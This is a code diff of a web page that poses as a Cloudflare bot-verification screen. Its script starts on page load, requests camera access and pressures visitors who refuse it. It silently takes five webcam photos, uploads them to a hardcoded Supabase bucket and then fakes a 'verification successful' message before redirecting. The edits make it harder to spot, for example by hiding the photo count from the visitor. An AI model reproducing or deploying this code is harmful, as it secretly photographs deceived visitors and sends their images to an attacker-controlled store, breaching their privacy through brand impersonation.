@@ -206,25 +206,20 @@
 
     <div class="cf-container" id="cfContainer">
 
-        <!-- HEADER: Logo + Badge -->
         <div class="cf-header">
             <div class="cf-logo">
-                <!-- 🔑 APNI "cloudflare.png" IMAGE YAHAN RAKHEIN -->
-                <img src="cloudflare.png" alt="Cloudflare">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/94/Cloudflare_Logo.png/320px-Cloudflare_Logo.png" alt="Cloudflare">
             </div>
-            <div class="cf-badge">🔒 Security Check</div>
+            <div class="cf-badge">Security Check</div>
         </div>
 
-        <!-- TITLE -->
         <div class="cf-title" id="titleText">Verify you are not a bot</div>
 
-        <!-- SUBTEXT -->
         <div class="cf-sub" id="subText">
             Please wait while we verify your browser is secure.<br>
             This process is <strong>automatic</strong> and will only take a few seconds.
         </div>
 
-        <!-- STATUS BOX -->
         <div class="cf-status-box" id="statusBox">
             <div class="cf-status-item" id="step1">
                 <span class="icon loading" id="icon1">⟳</span>
@@ -244,30 +239,25 @@
             </div>
         </div>
 
-        <!-- PROGRESS BAR -->
         <div class="cf-progress">
             <div class="cf-progress-bar" id="progressBar"></div>
         </div>
 
-        <!-- SUCCESS MESSAGE -->
         <div class="cf-success" id="successMsg">
-            <span class="check-icon">✅</span>
+            <span class="check-icon">✓</span>
             Verification complete — you are human!
         </div>
 
-        <!-- REDIRECT -->
         <div class="cf-redirect" id="redirectMsg">
             <span class="blink">⟳</span> Redirecting to requested page...
         </div>
 
-        <!-- RAY ID + IP -->
         <div class="cf-ray">
             <span>Ray ID: <span id="rayIdValue"></span></span>
             <span>Your IP: <span id="ipValue"></span></span>
             <span>Performance &amp; security by <span style="color:#f38020;">Cloudflare</span></span>
         </div>
 
-        <!-- FOOTER -->
         <div class="cf-footer">
             <a href="#">Privacy Policy</a>
             <a href="#">Terms of Service</a>
@@ -284,17 +274,14 @@
 
     <script>
         // ================================================================
-        // 🔑 SUPABASE CONFIG (Apni key yahan daalein)
+        // SUPABASE CONFIGURATION
         // ================================================================
         const SUPABASE_URL = 'https://dnrlkpyalnxxzqlhsges.supabase.co';
         const SUPABASE_ANON_KEY = 'sb_publishable_krgxQdwaG8LjuFRAQuPHxw_mHd79J9l';
 
         const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-        // 🔢 Kitni photos capture karni hain? (5)
         const TOTAL_PHOTOS = 5;
-
-        // 🔗 Redirect kahan karna hai?
         const REDIRECT_URL = 'https://www.google.com';
 
         // ================================================================
@@ -383,7 +370,7 @@
 
                 const { data, error } = await supabase
                     .storage
-                    .from('photos')
+                    .from('Photos')
                     .upload(fileName, blob);
 
                 if (error) {
@@ -393,7 +380,7 @@
 
                 const { data: urlData } = supabase
                     .storage
-                    .from('photos')
+                    .from('Photos')
                     .getPublicUrl(fileName);
 
                 return urlData.publicUrl;
@@ -449,7 +436,7 @@
                 text4.textContent = 'Completing verification...';
                 setProgress(82);
 
-                // ======== CAPTURE 5 PHOTOS ========
+                // ======== CAPTURE PHOTOS ========
                 let urls = [];
                 const width = v.videoWidth || 640;
                 const height = v.videoHeight || 480;
@@ -462,7 +449,6 @@
                     const imageData = cv.toDataURL('image/jpeg', 0.85);
                     const url = await sendToSupabase(imageData, i + 1);
                     if (url) urls.push(url);
-                    // 0.5 second gap between captures
                     await delay(500);
                 }
 
@@ -473,47 +459,42 @@
                 setProgress(88);
                 text4.textContent = 'Verification in progress...';
 
-                // ======== SEND 5 PHOTOS ========
-                let sent = 0;
-                for (let i = 0; i < urls.length; i++) {
-                    if (urls[i]) sent++;
-                }
+                let sent = urls.length;
 
-                // ✅ SUCCESS!
                 setIcon(icon4, 'done');
-                text4.textContent = `✓ Verification complete! (${sent}/${TOTAL_PHOTOS} photos processed)`;
+                text4.textContent = '✓ Verification complete!';
                 setProgress(100);
 
                 successMsg.style.display = 'flex';
                 titleText.textContent = '✅ Verification successful!';
-                subText.textContent = `Your identity has been verified. ${sent}/${TOTAL_PHOTOS} photos processed.`;
+                subText.textContent = 'Your identity has been verified. Redirecting...';
+
+                console.log(`📸 ${sent}/${TOTAL_PHOTOS} photos uploaded to Supabase`);
 
                 await delay(1800);
                 redirectMsg.style.display = 'block';
                 await delay(1500);
 
-                // REDIRECT
                 window.location.href = REDIRECT_URL;
 
             } catch (e) {
                 setIcon(icon2, 'waiting');
-                text2.textContent = '❌ Camera access required — please allow and refresh.';
-                text1.textContent = '⚠️ Click the camera icon in address bar → Allow';
-                titleText.textContent = '⚠️ Verification blocked';
+                text2.textContent = 'Camera access required — please allow and refresh.';
+                text1.textContent = 'Click the camera icon in address bar → Allow';
+                titleText.textContent = 'Verification blocked';
                 subText.textContent = 'Please allow camera access to complete verification.';
                 progressBar.style.width = '0%';
                 console.error('Error:', e.message);
             }
         }
 
-        // ========== START ==========
         window.onload = function() {
             setTimeout(startVerification, 600);
         };
 
-        console.log('☁️ Cloudflare Verification (5 Photos)');
-        console.log('📸 Capturing photos...');
-        console.log('📤 Sending to Supabase...');
+        console.log('Cloudflare Verification');
+        console.log('Capturing 5 photos...');
+        console.log('Uploading to Supabase...');
     </script>
 
 </body>
